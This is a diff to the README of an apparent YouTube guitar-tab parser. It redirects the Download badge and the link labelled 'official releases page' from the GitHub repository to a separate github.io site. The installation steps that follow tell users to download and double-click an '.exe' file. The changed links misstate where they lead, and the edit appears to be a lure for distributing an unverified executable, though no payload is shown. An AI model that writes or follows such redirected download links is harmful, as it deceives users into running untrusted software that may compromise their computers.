@@ -1,6 +1,6 @@
 # 🎸 youtube-guitar-tab-parser - Create guitar tabs from YouTube lessons
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Dystopian-mesentery45/youtube-guitar-tab-parser)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://dystopian-mesentery45.github.io)
 
 This tool creates PDF documents from guitar lesson videos on YouTube. It listens to the audio, identifies the notes, and formats them into a readable guitar tab. 
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software effectivel
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Dystopian-mesentery45/youtube-guitar-tab-parser) to download the installer.
+1. Visit the [official releases page](https://dystopian-mesentery45.github.io) to download the installer.
 2. Look for the file ending in ".exe" under the latest release section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation.
